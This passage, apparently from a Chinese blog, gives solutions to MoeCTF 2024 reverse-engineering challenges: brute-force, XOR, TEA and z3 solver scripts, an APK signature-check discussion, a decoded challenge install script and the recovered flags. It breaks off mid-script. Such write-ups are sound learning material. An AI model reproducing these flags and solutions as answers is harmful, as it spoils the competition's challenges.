src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724468535615-5af557bb-3d5b-4b4e-b21c-d47da3b9f0c1.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724469127727-6b6389b4-f381-4331-9bbf-0ea6697dee34.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472342291-10eaa4b2-d305-4504-9984-6d97e67bb432.png" class="" title="img"><p>模拟器运行不了，开启事件无法调试</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472556548-3ffe5532-4c5c-408c-88b1-7162c73af94f.png" class="" title="img"><p>要么根据签名v2直接找工具绕，要么找到密文直接base64解密，要么找检验函数修改后重新打包（最后一种比较难，出题者肯定不希望我们这样做）</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724511920066-c8aa02db-2683-46eb-9d0e-a56fe3bb7a01.png" class="" title="img"><p>META-INF是签名之后的文件，DebugProbestKt.bin用于后续调试</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724550601096-d661329a-fd5c-4eb7-b75c-4e53550dfd67.png" class="" title="img"><p>后面qetx找到<a href="https://appetize.io/app/android/cn.edu.xidian.myapplication?device=pixel7&osVersion=14.0">Play My Application (appetize.io)</a></p><p>可以模拟多个环境</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724642186848-ba9a7fd4-1481-46eb-a468-999ca49ed09d.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480966167-4da06b90-0272-46bc-8c06-6fb8d3f46ada.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480982752-32ee9808-4d52-46a3-9faa-c35ab1aa5a49.png" class="" title="img"><p>bW9lY3RmezU5ZmE2MDJjLTYyNGEtNDBiNy04YTVjLWUzNWU1NzRjZjliOX0&#x3D;</p><h2 id="SMCProMax"><a href="#SMCProMax" class="headerlink" title="SMCProMax"></a>SMCProMax</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724679306184-55d2be46-1f9f-42a2-937c-1b0513d92d4e.png" class="" title="img"><p>moectf{1111111111111111111111111111111111111111}</p><p>moectf{y0u_mu5t_know_vvHAt_1s__SMC__n0w}</p><p>直接爆破出来发现不对去调试，发现在下面会跳出</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724813588701-fddd2816-33a7-40d6-8d42-e0a2ae6029ea.png" class="" title="img"><p>一开始有个地方异或了，没执行到，但是最后的密文还是要异或一步</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0x7A5FB55E</span>,<span class="hljs-number">-490481854</span>,<span class="hljs-number">-1704322843</span>,<span class="hljs-number">-1418679088</span>,<span class="hljs-number">0x52C815D</span>,<span class="hljs-number">0x28D70A82</span>,<span class="hljs-number">0x398E5EAA</span>,<span class="hljs-number">0xFC4A5AF</span>,<span class="hljs-number">-1342106783</span>,<span class="hljs-number">0xCECDD9C3</span>&#125;; <br>    <span class="hljs-type">int</span> m=<span class="hljs-number">0xC4F3B4B3</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0x20202020</span>;j&lt;=<span class="hljs-number">0x7d7d7d7d</span>;j++)&#123;<br>            <span class="hljs-type">int</span> t=j;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">32</span>;k++)&#123;<br>                <span class="hljs-keyword">if</span> (t&gt;=<span class="hljs-number">0</span>)&#123;<br>                    t=t*<span class="hljs-number">2</span>;<br>                &#125; <br>                <span class="hljs-keyword">else</span>&#123;<br>                    t=t*<span class="hljs-number">2</span>;<br>                    t^=m;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(t==a[i])&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;n&lt;<span class="hljs-number">32</span>;n+=<span class="hljs-number">8</span>)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(j&gt;&gt;n)&amp;<span class="hljs-number">0xff</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>        &#125; <br><br><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>moectf&#123;y0u_mu5t_know_vvZAt_1s__SMC__n0w&#125;<br></code></pre></td></tr></table></figure><h2 id="xor-rev"><a href="#xor-rev" class="headerlink" title="xor_rev"></a>xor_rev</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827254498-19e8c8a8-5eb3-4534-a704-e2441493beaa.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">s=[<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,<br>   <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>]<br>enc=[<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3C</span>,<br>     <span class="hljs-number">0x12</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x33</span>,<br>     <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>,<br>     <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    enc[i]^=s[i%<span class="hljs-number">16</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#This_1s_a_f4k3_flag_plzTry_ag4in</span><br></code></pre></td></tr></table></figure><p>调试的时候发现后面还有tea</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827974635-2f61db70-4857-467b-8fda-e9511a9746fb.png" class="" title="img"><p>解tea的时候记得打印%02x</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x61C88647</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = (<span class="hljs-number">-32</span>)*delta, i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x5e87ff17</span>,<span class="hljs-number">0x9a831a78</span>,<span class="hljs-number">0x56c8707a</span>,<span class="hljs-number">0xc52f51</span>,<span class="hljs-number">0x8bc7393</span>,<span class="hljs-number">0xc7c31e09</span>,<span class="hljs-number">0xb1efa477</span>,<span class="hljs-number">0xddcf1d26</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x6C6C6568</span>, <span class="hljs-number">0x6F6D5F6F</span>, <span class="hljs-number">0x66746365</span>, <span class="hljs-number">0x34323032</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-comment">// v为要加密的数据是两个32位无符号整数</span><br>    <span class="hljs-comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">8</span>; m += <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//flag不全的话有可能是10</span><br>    sum = (<span class="hljs-number">-32</span>)*delta;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     <span class="hljs-comment">/* basic cycle start */</span><br>            v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + sum) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>            v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + sum) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>            sum += delta;<br>        &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>a=[<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,<br>  <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>]<br>enc=[<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x33</span>,<br>  <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>]<br>a1=[<span class="hljs-number">0x2B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>,<br>  <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3B</span>,<br>  <span class="hljs-number">0x16</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x19</span>,<br>  <span class="hljs-number">0x94</span>, <span class="hljs-number">0x87</span>]<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">32</span>):<br>    enc[i]^=a1[i]<br>    <span class="hljs-meta">#print(hex(enc[i]),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br>a2=[<span class="hljs-number">0x17</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0xbc</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x9</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xdd</span>]<br><br>def byte2uint32(d):<br>    l = []<br>    <span class="hljs-keyword">for</span> i in range(len(d) <span class="hljs-comment">// 4):</span><br>        tmp = d[i * <span class="hljs-number">4</span>:i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>]<br>        l.append(tmp[<span class="hljs-number">3</span>] * <span class="hljs-number">256</span> ** <span class="hljs-number">3</span> + tmp[<span class="hljs-number">2</span>] * <span class="hljs-number">256</span> ** <span class="hljs-number">2</span> + tmp[<span class="hljs-number">1</span>] * <span class="hljs-number">256</span> + tmp[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> l<br><br># enc_uint32 = byte2uint32(a2)<br><span class="hljs-meta"># print(<span class="hljs-string">&quot;\n&quot;</span>)</span><br><span class="hljs-meta"># for i in range(len(enc_uint32)):</span><br><span class="hljs-meta">#     print(hex(enc_uint32[i]),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br><br>s1=<span class="hljs-string">&quot;050a090f1b3916070a142b075c6f57551b1c33061a310630040d103946555349&quot;</span><br><span class="hljs-meta"># print(len(s1))</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">32</span>):<br>    <span class="hljs-meta">#print(int(s1[2*i:2*(i+1)],16))</span><br>    <span class="hljs-meta">#print((((int(s1[2*i:2*(i+1)],16)^a[i%16])+256)%256),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br>    print(chr((((<span class="hljs-type">int</span>(s1[<span class="hljs-number">2</span> * i:<span class="hljs-number">2</span> * (i + <span class="hljs-number">1</span>)], <span class="hljs-number">16</span>) ^ a[i % <span class="hljs-number">16</span>]) + <span class="hljs-number">256</span>) % <span class="hljs-number">256</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="Secret-Module"><a href="#Secret-Module" class="headerlink" title="Secret_Module"></a>Secret_Module</h2><p>sh文件base64+解压缩得到php</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723275505793-96bed9fe-45c9-4f68-83fb-4695676721f3.png" class="" title="img"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">testk</span>() &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to the Secret module!But before you begin,you need to prove your self.&quot;</span><br>  (/system/bin/getevent -lc <span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events) || <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;   <br><br><span class="hljs-title function_ invoke__">choose</span>() &#123;<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>  /system/bin/getevent -lc <span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events<br>  <span class="hljs-keyword">if</span> (`cat <span class="hljs-variable">$MODPATH</span>/events <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span> | /system/bin/grep VOLUME &gt;/dev/<span class="hljs-literal">null</span>`); then<br>  <span class="hljs-keyword">break</span><br>  fi<br>  done<br>  <span class="hljs-keyword">if</span> (`cat <span class="hljs-variable">$MODPATH</span>/events <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span> | /system/bin/grep VOLUMEUP &gt;/dev/<span class="hljs-literal">null</span>`); then<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;114514&quot;</span><br>  <span class="hljs-keyword">else</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1919810&quot;</span><br>  fi<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> testk; then<br>  ui_print <span class="hljs-string">&quot;Great! Now enter the secret.&quot;</span><br><br>  <span class="hljs-keyword">else</span><br>  ui_print <span class="hljs-string">&quot;Legacy Device. Use a newer device to do this challenge&quot;</span><br>  <span class="hljs-keyword">exit</span><br>  fi<br><br>  concatenated=<span class="hljs-string">&quot;&quot;</span><br><br>  <span class="hljs-keyword">for</span> i in <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br>    <span class="hljs-keyword">do</span><br>      result=$(choose)<br>        concatenated=<span class="hljs-string">&quot;$&#123;concatenated&#125;$&#123;result&#125;&quot;</span><br>        done<br><br>          input_str=$(<span class="hljs-keyword">echo</span> -n <span class="hljs-variable">$concatenated</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>          sec=<span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br>          <span class="hljs-keyword">if</span> test <span class="hljs-variable">$input_str</span> = <span class="hljs-variable">$sec</span><br>            then<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are right!Flag is&#x27;</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moectf<span class="hljs-subst">&#123;$concatenated&#125;</span>&quot;</span><br>            <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong. Try again.&#x27;</span><br>            <span class="hljs-keyword">exit</span><br>            fi<br></code></pre></td></tr></table></figure><h2 id="Cython-Strike"><a href="#Cython-Strike" class="headerlink" title="Cython_Strike"></a>Cython_Strike</h2><p>得到whl，看格式是zip，解压得到pyd</p><p>有一些打印出来的描述和很像flag的字符串，但不知道如何加密了</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794082239-1f5187f0-1d2c-4d59-b427-1cc80757b37e.png" class="" title="img"><p>先用python3.12导入，help之后看方法，mask刚好是运行获得的</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794067248-dfc751dc-3e6c-4f15-a2b0-6f79c39cad3e.png" class="" title="img"><p>需要知道输入的密码，两个方程算出来的input不一样，都去试一下发现第二个是对的</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794193586-b9dcc0cd-276e-44d1-94bb-83d9113bfad1.png" class="" title="img"><p>后面发现&#x3D;&#x3D;优先级高于^，也就是说第一个方程没用，同时真正的flag和上面的字符串长度一样，但不知道如何代换的</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794288624-396fbbc5-8493-48cc-840e-498c2fd2bf3c.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723795016076-4fcc7ef5-fe44-4887-9f60-7d7b3beca049.png" class="" title="img"><p>发现和ida显示的一摸一样</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794998339-b10e992b-c73a-4ef5-9ba5-2bc5a557cda7.png" class="" title="img"><h2 id="babe-z3"><a href="#babe-z3" class="headerlink" title="babe_z3"></a>babe_z3</h2><p>通过推理可得，v4最后要不等于0，而23行强制类型转化之后也要不等于0，那么v4|&#x3D;0x100000000之后要为0x100000000，也就是说一开始v4为0，即第一个表达式没用</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723949889550-5afdc433-ff84-47cc-8481-3e6b65b3335a.png" class="" title="img"><p>这里v6,v7,v8其实都是s的一部分，也就是说都要打印</p><p>最后得到的字符串都要逆序因为按小端序存储</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 定义变量</span><br>s = BitVec(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">64</span>)<br>v6 = BitVec(<span class="hljs-string">&#x27;v6&#x27;</span>, <span class="hljs-number">64</span>)<br>v7 = BitVec(<span class="hljs-string">&#x27;v7&#x27;</span>, <span class="hljs-number">64</span>)<br>v8 = BitVec(<span class="hljs-string">&#x27;v8&#x27;</span>, <span class="hljs-number">64</span>)<br>v4 = BitVec(<span class="hljs-string">&#x27;v4&#x27;</span>, <span class="hljs-number">64</span>)<br>solver = Solver()<br><br>solver.add((v7 &amp; s &amp; v8 | (~(v6 | s) | v6 &amp; v7) &amp; v6 &amp; s) == <span class="hljs-number">0x2024243035302131</span>)<br>solver.add((v6 ^ (v7 &amp; (s + v7) | v8 &amp; ~(v7 &amp; s) | v6 &amp; (v6 + v8) &amp; ~s)) == <span 